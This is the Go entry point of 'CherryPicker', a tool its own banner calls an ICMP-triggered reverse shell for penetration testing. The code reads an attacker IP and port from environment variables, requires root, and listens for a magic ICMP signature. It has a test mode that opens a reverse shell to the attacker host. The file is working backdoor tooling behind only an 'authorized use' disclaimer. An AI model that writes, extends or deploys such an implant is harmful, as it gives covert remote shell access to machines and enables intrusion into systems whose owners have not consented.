package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"
)

const banner = `
  ____ _                          ____  _      _             
 / ___| |__   ___ _ __ _ __ _   _|  _ \(_) ___| | _____ _ __ 
| |   | '_ \ / _ \ '__| '__| | | | |_) | |/ __| |/ / _ \ '__|
| |___| | | |  __/ |  | |  | |_| |  __/| | (__|   <  __/ |   
 \____|_| |_|\___|_|  |_|   \__, |_|   |_|\___|_|\_\___|_|   
                            |___/                             
ICMP-Triggered Reverse Shell for Authorized Penetration Testing
Version: 1.0.0
`

func main() {
	// Command line flags
	testMode := flag.Bool("test", false, "Test configuration and connection")
	showConfig := flag.Bool("show-config", false, "Show current configuration")
	flag.Parse()

	fmt.Print(banner)
	log.Println("[*] CherryPicker starting...")
	log.Println("[!] For authorized penetration testing only!")

	// Load configuration
	cfg := LoadConfig()

	// Validate configuration
	if err := cfg.Validate(); err != nil {
		log.Fatalf("[!] Invalid configuration: %v\n", err)
	}

	if *showConfig {
		fmt.Printf("\nCurrent Configuration:\n")
		fmt.Printf("  Attack IP:   %s\n", cfg.AttackIP)
		fmt.Printf("  Attack Port: %d\n", cfg.AttackPort)
		fmt.Printf("  Magic Sig:   %q\n", string(cfg.MagicSignature))
		fmt.Printf("\nTo change config, set environment variables:\n")
		fmt.Printf("  ATTACK_IP, ATTACK_PORT, MAGIC_SIG (hex encoded)\n\n")
		return
	}

	if *testMode {
		log.Println("[*] Running in test mode...")
		log.Printf("[*] Testing connection to %s:%d\n", cfg.AttackIP, cfg.AttackPort)

		if err := TestConnection(cfg); err != nil {
			log.Fatalf("[!] Connection test failed: %v\n", err)
		}

		log.Println("[+] Connection test successful!")
		log.Println("[*] Starting test reverse shell...")

		if err := StartReverseShellWithBanner(cfg); err != nil {
			log.Fatalf("[!] Test reverse shell failed: %v\n", err)
		}

		return
	}

	// Check for root privileges
	if err := CheckPrivileges(); err != nil {
		log.Fatalf("[!] %v\n", err)
	}

	log.Printf("[*] Configuration loaded:")
	log.Printf("    - Target: %s:%d\n", cfg.AttackIP, cfg.AttackPort)
	log.Printf("    - Signature: %d bytes\n", len(cfg.MagicSignature))

	// Create ICMP listener
	listener, err := NewICMPListener(cfg)
	if err != nil {
		log.Fatalf("[!] Failed to create listener: %v\n", err)
	}

	// Setup signal handler for graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)

	// Start listener in goroutine
	errChan := make(chan error, 1)
	go func() {
		errChan <- listener.Listen()
	}()

	// Wait for signal or error
	select {
	case <-sigChan:
		log.Println("\n[*] Interrupt received, shutting down...")
		listener.Close()
	case err := <-errChan:
		if err != nil {
			log.Fatalf("[!] Listener error: %v\n", err)
		}
	}

	log.Println("[*] CherryPicker stopped")
}
